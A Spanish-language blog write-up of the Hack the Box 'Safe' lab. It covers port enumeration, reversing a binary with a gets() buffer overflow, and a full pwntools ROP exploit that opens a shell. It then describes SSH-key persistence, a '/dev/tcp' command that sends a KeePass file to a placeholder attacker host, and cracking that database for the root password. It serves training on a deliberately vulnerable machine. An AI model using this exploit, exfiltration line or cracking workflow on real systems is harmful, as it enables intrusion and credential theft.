---
layout: post
title: Maquina Safe
date: 2022-06-14 18:50:20 +0200
description: Máquina Safe de Hack the Box # Add post description (optional)
img: safe.png # Add image post (optional)
fig-caption: # Add figcaption (optional)
tags: [safe, overflow, binaries]
---

  Este es un writeup de la maquina de Hack the Box safe, clasificada
  como fácil, en la que tocaremos básicamente técnicas de análisis de
  binarios, desarrollo de buffer overflow y creación de exploits en
  python.


************************
# Enumeración

En primer lugar realizamos una enumeración de la maquina con nmap y
descubrimos que tiene abiertos tres puertos el 22, el 80 y el 1337.

>Nmap 7.92 scan initiated Mon May 30 19:11:17 2022 as: nmap -sS -p- -n -Pn --min-rate 5000 -oG allports 10.10.10.147
>Host: 10.10.10.147 ()	Status: Up
>Host: 10.10.10.147 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 1337/open/tcp//waste///	Ignored State: closed (65532)
>Nmap done at Mon May 30 19:11:30 2022 -- 1 IP address (1 host up) scanned in 13.29 seconds


Realizamos un reconocimiento de versiones y vemos que en el puerto 1337
se esta ejecutando una aplicación.

>Nmap 7.92 scan initiated Thu Jun  9 19:48:36 2022 as:
> nmap -sCV -p22,80,1337 -oN Versions -Pn 10.10.10.147
>Nmap scan report for 10.10.10.147
>Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     13:48:54 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
|   DNSVersionBindReqTCP: 
|     13:48:49 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
|   GenericLines: 
|     13:48:37 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   GetRequest: 
|     13:48:44 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions: 
|     13:48:44 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help: 
|     13:49:00 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? HELP
|   NULL: 
|     13:48:37 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
|   RPCCheck: 
|     13:48:44 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
|   RTSPRequest: 
|     13:48:44 up 2 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq, TerminalServerCookie: 
|     13:49:00 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   TLSSessionReq: 
|     13:49:01 up 3 min, 0 users, load average: 0.00, 0.00, 0.00
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.92%I=7%D=6/9%Time=62A2327B%P=x86_64-pc-linux-gnu%r(NUL
SF:L,3E,"\x2013:48:37\x20up\x202\x20min,\x20\x200\x20users,\x20\x20load\x2
SF:0average:\x200\.00,\x200\.00,\x200\.00\n")%r(GenericLines,63,"\x2013:48
SF::37\x20up\x202\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\
SF:.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ech
SF:o\x20back\?\x20\r\n")%r(GetRequest,71,"\x2013:48:44\x20up\x202\x20min,\
SF:x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00
SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20/
SF:\x20HTTP/1\.0\r\n")%r(HTTPOptions,75,"\x2013:48:44\x20up\x202\x20min,\x
SF:20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\
SF:n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\x
SF:20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,75,"\x2013:48:44\x20up\x202\x20min
SF:,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.
SF:00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTION
SF:S\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3E,"\x2013:48:44\x20up\x202\x20min
SF:,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.
SF:00\n")%r(DNSVersionBindReqTCP,3E,"\x2013:48:49\x20up\x203\x20min,\x20\x
SF:200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")%
SF:r(DNSStatusRequestTCP,3E,"\x2013:48:54\x20up\x203\x20min,\x20\x200\x20u
SF:sers,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")%r(Help,6
SF:7,"\x2013:49:00\x20up\x203\x20min,\x20\x200\x20users,\x20\x20load\x20av
SF:erage:\x200\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\
SF:x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,64,"\x2013:49:00\
SF:x20up\x203\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,
SF:\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x2
SF:0back\?\x20\x16\x03\n")%r(TerminalServerCookie,63,"\x2013:49:00\x20up\x
SF:203\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.
SF:00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?
SF:\x20\x03\n")%r(TLSSessionReq,64,"\x2013:49:01\x20up\x203\x20min,\x20\x2
SF:00\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n\nWh
SF:at\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x16\x03\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Thu Jun  9 19:50:13 2022 -- 1 IP address (1 host up) scanned in 96.54 seconds


Se realiza un reconocimiento de el puerto 80 vía http y encontramos un
servidor apache aún sin configurar lo que nos da una idea de una máquina
en producción.

![Página en producción]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_19_52_15.png)

Vemos el código fuente de página y descubrimos un comentario. La
aplicación 'myapp' puede ser descargada por el puerto 1337

![Código fuente de la pagina web]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_19_52_54.png)

Descargamos la aplicación, la ejecutamos y vemos que es una sencilla
aplicación que nos devuelve date y un eco de lo que nosotros escribamos.

****************
# Análisis de binarios

Una vez descargada la aplicación vamos a analizarla, para ello usaremos
Ghidra, una herramienta de ingeniería inversa de código abierto y
gratuita desarrollada por la NSA. Cargamos la aplicación en Ghidra y
analizamos las funciones, en la funcion main podemos ver el código hecho
en C. Vemos que crea un buffer y usa gets y puts para el input de
usuario. No tiene sanitización y posiblemente sea vulnerable a buffer
overflow.

![Análisis con Ghidra]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_19_58_40.png)

Vamos a usar la herramienta Gdb para comprobar si realmente es
vulnerable. Creamos un string de 200 Aes con Python 
>Python3>\>\>print(\"A\"\*200)\

Copiamos el resultado, arrancamos gdb y cargamos 
>'myapp'--\> gdb ./myapp\

Ejecutamos myapp dentro de gdb y le pasamos las 200 Aes. En el resultado
podemos ver el desbordamiento de pila.

![Desbordamiento de pila]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_20_07_39.png)

Ahora necesitamos saber cuantos caracteres tenemos que inyectar para
tomar el control del registro rsp (stack pointer), para ello creamos un
patrón de 200 caracteres en gdb con pattern create 200 y lo inyectamos.
Para averiguar el offset usamos:
> gdb--\>pattern offset %rsp y nos da un offset de 120 (little endian)

![Calculo del offset de %rsp]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_20_11_37.png)

Tenemos que ver que protecciones tiene activadas para ello ejecutamos en gdb
>gdb--\>checksec\
Y vemos que tiene activada NX bit, protección contra escritura (DEP).
Con esto no podemos usar la pila para cargar nuestro payload, tendremos
que usar técnicas de Rop (Return-oriented programing). 
[Aquí](https://shakuganz.com/2021/06/07/return-oriented-programming-rop-gnu-linux-version) hay información al respecto.

![Registro rdi]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_20_25_04.png)

Sabemos que en el registro rdi se almacena la cadena "/usr/bin/uptime", si logramos cargar en el registro rdi la cadena "/bin/sh", podriamos
hacer que nos diera una shell con el usuario con que se esté ejecutando el programa.  
Como tenemos el control de rsp podemos cargar la cadena en rsp y luego moverlo a rdi pero eso no lo podemos hacer sin mas, necesitamos alguna función que tenga esos opcodes.  
Buscando en ghidra encontramos que la función test tiene MOV RDI,RSP, después tiene un salto a R13.

![Función Test en Ghidra]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_20_26_58.png)

Ahora necesitamos buscar gadgets para encontrar un pop a R13, en gdb usamos ropper:
>gdb-->ropper --search "pop r13" 

Nos devuelve la dirección de memoria con las llamadas a r13, r14, r15 y ret.

![Búsqueda de pop r13]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_20_30_18.png)

Necesitamos la dirección de system para hacer la llamada a la cadena que vamos a guardar en rdi, la podemos conseguir haciendo un objectdump a myapp de la siguente manera:
>objdump -D ./myapp | grep system

Eso nos devuelve la dirección de system@plt

![Objdump a System]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_20_33_54.png)

Ya solo nos falta hacer la llamada a la función test para que inicie el proceso, la encontramos con:
>objdump -D ./myapp | grep test

![Objdump a Test]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_20_35_30.png)

Con esto ya lo tenemos todo, vamos a hacer un Exploit en Python.

*******************************

#Explotación


Vamos a crear un exploit en python3 que haga la llamada al programa, desborde el buffer y meta las instrucciones en los registros.

>\#!/usr/bin/python3

>from pwn import *

>context(terminal=['tmux', 'new-window'])

>context(os='linux', arch='amd64')

>p = remote("10.10.10.147", 1337)

>junk = b"A"*112 # a los 120 se restan los caracteres de /bin/sh\x00 = 7 caracteres + nullbyte = 8 caracteres

>bin_sh = b"/bin/sh\x00"

>\# gef➤  ropper --search "pop r13"

>\# 0x0000000000401206: pop r13; pop r14; pop r15; ret; 

>pop_r13 = p64(0x401206)
>null = p64(0x0)

>\#  0000000000401040 <system@plt>:

>\#  401040:	ff 25 da 2f 00 00    	jmp    *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5\>

>\#  40116e:	e8 cd fe ff ff       	call   401040 <system@plt>

>system_plt = p64(0x401040)

>\# 0000000000401152 <test>:

>test = p64(0x401152)

>payload = junk + bin_sh + pop_r13 + system_plt + null + null + test

>p.sendline(payload)

>p.interactive()

Lanzamos el exploit y nos na una shell de usuario con el usuario user.

![Shell de user]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_20_36_47.png)

Esta es una pseudo consola, lo  ideal seria poder usar una consola plena, revisamos el home del user y ya podemos ver la flag de user, ademas vemos que tiene .ssh con lo que podemos crear un par de claves en nuestro equipo y copiar la clave publica a la maquina safe como authorized\_keys y asi poder entrar por ssh como user sin que nos pida la contraseña.

![Authorized_keys]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_21_13_17.png)

***************************

#Escalada de privilegios

Una vez dentro como user vemos que en el home tenemos un archivo de keepass y unas cuantas imagenes, nos las copiamos a nuestra maquina para poder enumerarlas. Como la máquina no tiene ni curl, ni wget ni python podemos intentar copiarlas mediante bussybox: 
>busybox httpd -f -p 8000
 
o directamente con cat.
>cat < MyPasswords.kdbx >/dev/tcp/tuip/puerto 

En nuestro equipo nos ponemos en escucha por netcat y metemos la salida al archivo MyPasswords.kdbx. También podemos usar scp para pasar los archivos.  
Una vez en nuestro equipo las abrimos con keepassxc, nos pide una password y una keyfile.  
Con keepass2john sacamos los hashes de Mypassword.kdbx y luego los pasamos por john the ripper, pero no tenemos suerte.  
Volvemos a pasar el keepass2john pero esta vez a las imagenes.
>keepass2john -k imagenes MyPassword.kdbx  

Con esto nos dará los hashes que luego intentaremos romper con johntheripper.

![Hashes de las imágenes]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_21_00_41.png)


Al pasar los hashes por john uno de ellos nos da la contraseña, bullshit. Con ella y la imagen ya lo tenemos todo, ya podemos obtener la contraseña de root.

![Contraseña de root]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_21_03_39.png)

Solo nos queda entrar por ssh como user y una vez dentro solo queda convertirse en root con la contraseña que hemos copiado y obtener la flag.

![Flag de root]({{site.baseurl}}/assets/img/Safe/screensht_22-06-09_21_17_20.png)


Hasta aquí la máquina Safe, una maquina clasificada como Easy por HTB pero yo la clasificaría como Medium por su Enumeración de binarios y su buffer overflow.

Hasta otra¡


















